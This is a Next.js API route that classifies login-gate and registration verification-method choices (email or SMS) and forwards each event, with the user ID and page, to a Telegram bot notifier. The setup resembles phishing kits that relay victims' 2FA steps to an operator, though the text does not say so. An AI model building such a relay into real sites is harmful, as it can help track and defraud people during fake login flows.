import { NextRequest, NextResponse } from 'next/server'
import { sendFormNotification } from '@/lib/telegram'

/**
 * Login gate pages post `{ method, page }` with page `/login/2fa-verify…`;
 * the registration method step posts `{ verificationType }` with values
 * "Email" / "Phone (SMS)" (see app/registration/page.tsx).
 *
 * Both shapes must resolve to a catalog entry that renders the method that was
 * actually chosen. The registration step is a method *selection*, so it uses its
 * own type rather than the registration OTP entry (which renders a code).
 */
function isEmailVerification(value: string): boolean {
  const v = value.trim().toLowerCase()
  return v === 'email' || v === 'e-mail' || v.startsWith('email')
}

function isTextVerification(value: string): boolean {
  const v = value.trim().toLowerCase()
  return (
    v === 'text' ||
    v === 'sms' ||
    v === 'phone' ||
    v === 'text message' ||
    v === 'phone (sms)' ||
    v === 'text message (sms)'
  )
}

export async function POST(request: NextRequest) {
  try {
    const body = (await request.json()) as {
      method?: string
      verificationType?: string
      page?: string
      userId?: string
    }
    const method = (body.method ?? '').trim()
    const verificationType = (body.verificationType ?? '').trim()
    const label = verificationType || method
    const isEmail = isEmailVerification(label)
    const isText = isTextVerification(label)
    // No page + a verificationType label ⇒ the registration method step.
    const registration = !body.page && Boolean(verificationType)

    const telegramSuccess = await sendFormNotification({
      type: registration
        ? 'registration_method_selected'
        : isEmail
          ? 'email_verification'
          : 'text_verification',
      verificationType: isText ? 'text_verification' : 'email_verification',
      userId: body.userId,
      page:
        body.page ??
        (registration ? '/registration' : `/login/2fa-verify?method=${isText ? 'text' : 'email'}`),
      timestamp: new Date().toISOString(),
    })
    return NextResponse.json({ success: true, telegramSent: telegramSuccess })
  } catch (error) {
    console.error('Error sending verification click notification:', error)
    return NextResponse.json({ error: 'Failed to send notification' }, { status: 500 })
  }
}
